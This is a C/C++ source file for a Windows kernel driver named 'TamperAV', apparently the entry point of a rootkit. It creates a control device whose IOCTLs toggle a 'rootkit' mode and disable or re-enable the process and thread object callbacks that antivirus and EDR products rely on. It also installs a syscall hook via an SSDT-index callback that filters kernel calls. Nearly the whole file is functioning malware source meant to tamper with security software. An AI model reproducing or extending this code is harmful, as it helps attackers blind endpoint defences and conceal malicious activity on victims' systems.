#include "rootkit.h"
#include "enumCallback.hpp"
#include <wdm.h>
#define NO_MORE_ENTRIES		0

#define symlink_name L"\\??\\TamperAV"
#define device_name L"\\device\\TamperAV"
#define THREAD_REGISTER_CALLBACK_OFF CTL_CODE(FILE_DEVICE_UNKNOWN,    0x800,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define THREAD_REGISTER_CALLBACK_ON CTL_CODE(FILE_DEVICE_UNKNOWN,    0x801,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define ROOTKIT_ON CTL_CODE(FILE_DEVICE_UNKNOWN,    0x802,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define ROOTKIT_OFF CTL_CODE(FILE_DEVICE_UNKNOWN,    0x803,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define PROCESS_REGISTER_CALLBACK_OFF CTL_CODE(FILE_DEVICE_UNKNOWN,    0x804,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define PROCESS_REGISTER_CALLBACK_ON CTL_CODE(FILE_DEVICE_UNKNOWN,    0x805,  METHOD_BUFFERED,FILE_ANY_ACCESS)
PDEVICE_OBJECT pMyDevice;
UNICODE_STRING DeviceName;
UNICODE_STRING SymLinkName;
bool rootkit_on = FALSE;

void __fastcall call_back(unsigned long ssdt_index, void** ssdt_address)
{
				if (!rootkit_on) return;
				filter(ssdt_index, ssdt_address);
}

VOID DriverUnload(PDRIVER_OBJECT driver)
{
				UNREFERENCED_PARAMETER(driver);

				k_hook::stop();
}

NTSTATUS MyCreateDevice(PDRIVER_OBJECT driver_object)
{
				NTSTATUS status;
				RtlInitUnicodeString(&DeviceName, device_name);
				RtlInitUnicodeString(&SymLinkName, symlink_name);
				status = IoCreateDevice(driver_object, 0, &DeviceName, FILE_DEVICE_UNKNOWN, 0, 1, &pMyDevice);
				if (NT_SUCCESS(status))
				{
								driver_object->DeviceObject = pMyDevice;
								status = IoCreateSymbolicLink(&SymLinkName, &DeviceName);
								if (NT_SUCCESS(status))
								{
												return status;
								}
				}
				return status;
}

NTSTATUS MyDisPatcher(PDEVICE_OBJECT device_object, PIRP irp) {
				NTSTATUS status = STATUS_SUCCESS;
				ULONG functionCode = 0;
				PIO_STACK_LOCATION irp_stack = IoGetCurrentIrpStackLocation(irp);
				if (device_object != pMyDevice)
				{
								status = STATUS_UNSUCCESSFUL;
								return status;
				}
				switch (irp_stack->MajorFunction)
				{
				case IRP_MJ_DEVICE_CONTROL:
								functionCode = irp_stack->Parameters.DeviceIoControl.IoControlCode;
								switch (functionCode)
								{
								case THREAD_REGISTER_CALLBACK_OFF:
												EnumThreadObCallback(false);
												break;
								case THREAD_REGISTER_CALLBACK_ON:
												EnumThreadObCallback(true);
												break;
								case ROOTKIT_ON:
												rootkit_on = TRUE;
												break;
								case ROOTKIT_OFF:
												rootkit_on = FALSE;
												break;
								case PROCESS_REGISTER_CALLBACK_OFF:
												EnumProcessObCallback(false);
												break;
								case PROCESS_REGISTER_CALLBACK_ON:
												EnumProcessObCallback(true);
												break;
								default:
												break;
								}
								break;
				default:
								break;
				}
				irp->IoStatus.Status = STATUS_SUCCESS;
				irp->IoStatus.Information = 0;
				IoCompleteRequest(irp, IO_NO_INCREMENT);
				return status;
}

EXTERN_C
NTSTATUS
DriverEntry(
				PDRIVER_OBJECT driver,
				PUNICODE_STRING registe)
{
				UNREFERENCED_PARAMETER(registe);
				driver->MajorFunction[IRP_MJ_CREATE] = MyDisPatcher;
				driver->MajorFunction[IRP_MJ_CLOSE] = MyDisPatcher;
				driver->MajorFunction[IRP_MJ_READ] = MyDisPatcher;
				driver->MajorFunction[IRP_MJ_WRITE] = MyDisPatcher;
				driver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyDisPatcher;
				NTSTATUS status = MyCreateDevice(driver);
				driver->DriverUnload = DriverUnload;
				SetNtFunction();
				return k_hook::initialize(call_back) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
}